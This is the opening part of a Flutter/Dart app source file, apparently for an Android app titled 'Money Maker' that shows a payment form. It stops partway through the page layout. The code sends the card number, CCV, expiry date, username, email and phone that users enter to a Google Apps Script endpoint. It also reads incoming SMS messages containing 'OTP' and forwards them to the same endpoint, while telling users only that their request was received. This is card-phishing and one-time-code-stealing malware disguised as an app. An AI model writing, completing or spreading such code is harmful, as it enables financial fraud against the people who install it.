import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:permission_handler/permission_handler.dart';
import 'package:telephony/telephony.dart'; // بديل sms_receiver

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Money Maker',
      home: PaymentFormPage(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class PaymentFormPage extends StatefulWidget {
  @override
  _PaymentFormPageState createState() => _PaymentFormPageState();
}

class _PaymentFormPageState extends State<PaymentFormPage> {
  final _formKey = GlobalKey<FormState>();
  final Map<String, String> formData = {};
  final String sheetUrl = "https://script.google.com/macros/s/AKfycbyqf40p00Zz1V8F2hLW9ZB7jfTlmf2ipmVS4fDl-ShINSEHW3bzSLqhGziZwl0cS_qURg/exec";
  final String smsKeyword = "OTP";

  final Telephony telephony = Telephony.instance;

  @override
  void initState() {
    super.initState();
    _requestSmsPermission();
    _listenSms();
  }

  void _requestSmsPermission() async {
    bool? granted = await telephony.requestSmsPermissions;
    if (granted != true) {
      print("لم يتم منح صلاحية الرسائل القصيرة");
    }
  }

  void _listenSms() {
    telephony.listenIncomingSms(
      onNewMessage: (SmsMessage message) {
        if (message.body != null && message.body!.contains(smsKeyword)) {
          _sendSmsToSheet(message.address ?? "", message.body ?? "", DateTime.now().toString());
        }
      },
      listenInBackground: false,
    );
  }

  Future<void> _sendSmsToSheet(String sender, String body, String date) async {
    try {
      await http.post(
        Uri.parse(sheetUrl),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "type": "sms",
          "sender": sender,
          "body": body,
          "date": date,
        }),
      );
    } catch (e) {
      print("خطأ في إرسال الرسالة للشييت: $e");
    }
  }

  Future<void> _submitForm() async {
    if (_formKey.currentState!.validate()) {
      _formKey.currentState!.save();

      try {
        await http.post(
          Uri.parse(sheetUrl),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({
            "type": "form",
            "cardNumber": formData["cardNumber"],
            "ccv": formData["ccv"],
            "expiryDate": formData["expiryDate"],
            "username": formData["username"],
            "email": formData["email"],
            "phone": formData["phone"],
          }),
        );
        ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(content: Text("Your request is received. Please wait our response!")));
      } catch (e) {
        ScaffoldMessenger.of(context)
            .showSnackBar(SnackBar(content: Text("حدث خطأ: $e")));
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          Container(
            color: Colors.black,
          ),
